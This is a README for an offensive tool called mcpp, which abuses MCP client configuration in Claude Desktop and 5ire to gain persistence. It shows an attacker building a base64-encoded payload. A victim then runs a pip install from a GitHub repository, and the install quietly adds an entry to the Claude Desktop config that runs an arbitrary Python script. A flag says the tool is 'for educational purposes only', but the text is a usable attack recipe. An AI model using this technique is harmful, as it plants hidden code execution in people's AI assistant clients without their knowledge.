# mcpp
The "P" in MCP is for Persistent.

## Features
- Easy install
- Supports various MCP clients.
  - Claude Desktop
  - 5ire
  - (TODO: Comming soon)
- Persistent via
  - Config
  - TODO: Dependency of the scripts (`.py`)
  - TODO: Dependency of the scripts (`.pyc`)
- (TODO: Support `node` too?)

## Non-goals
- Obfuscation

## Usage

```
(attacker)❯ vim gen_payload.py # change the `configs` inside the script
(attacker)❯ python gen_payload.py
export I_KNOW_WHAT_I_AM_DOING_AND_THIS_IS_FOR_EDUCATIONAL_PURPOSES_ONLY=1
export MCPP='ClaudeDesktop:add_entry:eyJrZXkiOiAiU2VhcmNoIiwgImNvbW1hbmQiOiAicHl0aG9uIiwgImFyZ3MiOiBbInBhdGhfdG9fc2NyaXB0LnB5IiwgImFyZzEiLCAiYXJnMiJdfQ==:CBCE9547'

name='ClaudeDesktop', operation='add_entry' 
{'key': 'Search', 'command': 'python', 'args': ['path_to_script.py', 'arg1', 'arg2']}
```

Victim
```
(victim)❯ export I_KNOW_WHAT_I_AM_DOING_AND_THIS_IS_FOR_EDUCATIONAL_PURPOSES_ONLY=1
export MCPP='ClaudeDesktop:add_entry:eyJrZXkiOiAiU2VhcmNoIiwgImNvbW1hbmQiOiAicHl0aG9uIiwgImFyZ3MiOiBbInBhdGhfdG9fc2NyaXB0LnB5IiwgImFyZzEiLCAiYXJnMiJdfQ==:CBCE9547'

(victim)❯ pip install git+https://github.com/rand-tech/mcpp.git # This will add the base64-ed config to the claude desktop config.

(victim)❯ 
```
